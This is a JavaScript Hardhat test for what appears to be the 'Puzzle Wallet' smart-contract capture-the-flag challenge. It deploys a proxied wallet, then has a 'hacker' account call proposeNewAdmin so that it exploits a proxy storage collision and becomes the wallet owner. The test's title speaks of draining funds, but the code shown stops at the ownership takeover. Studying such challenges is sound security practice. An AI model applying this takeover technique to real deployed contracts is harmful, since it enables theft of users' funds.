const { expect } = require("chai");
require('chai')
    .use(require('chai-as-promised'))
    .should()

describe("Puzzle Wallet", function () {
  it("Should drain the wallet", async function () {

    const [owner, admin, user1, user2, hacker] = await ethers.getSigners();
    
    const PuzzleWallet = await ethers.getContractFactory("PuzzleWallet", owner);
    const PuzzleProxy = await ethers.getContractFactory("PuzzleProxy", owner);

    this.puzzleWallet = await PuzzleWallet.deploy();

    // create a PuzzleWallet interface with the functions we need to hack the wallet, this will become handy to deploy PuzzleProxy
    const wallet_interface = new ethers.utils.Interface(["function deposit()", "function init(uint256)", "function multicall(bytes[])"])
    // encode init function to deploy PuzzleProxy
    const init_encode = wallet_interface.encodeFunctionData("init", [ethers.utils.parseEther('10.0')]);

    this.puzzleProxy = await PuzzleProxy.deploy(admin.address, this.puzzleWallet.address, init_encode);

    this.wallet = PuzzleWallet.attach(this.puzzleProxy.address);

    expect(await this.wallet.owner()).to.equal(owner.address);
    expect(await this.puzzleProxy.admin()).to.equal(admin.address);

    await this.wallet.addToWhitelist(user1.address);
    await this.wallet.addToWhitelist(user2.address);

    expect(await this.wallet.whitelisted(user1.address)).to.be.true;
    expect(await this.wallet.whitelisted(user2.address)).to.be.true;
    expect(await this.wallet.whitelisted(hacker.address)).to.be.false;
    
    await this.wallet.connect(user1).deposit({value: ethers.utils.parseEther('1.0')});
    await this.wallet.connect(user2).deposit({value: ethers.utils.parseEther('2.0')});
    await this.wallet.connect(hacker).deposit({value: ethers.utils.parseEther('0.1')}).should.be.rejected;

    await this.puzzleProxy.connect(hacker).proposeNewAdmin(hacker.address);
    expect(await this.wallet.owner()).to.equal(hacker.address);
  });
});
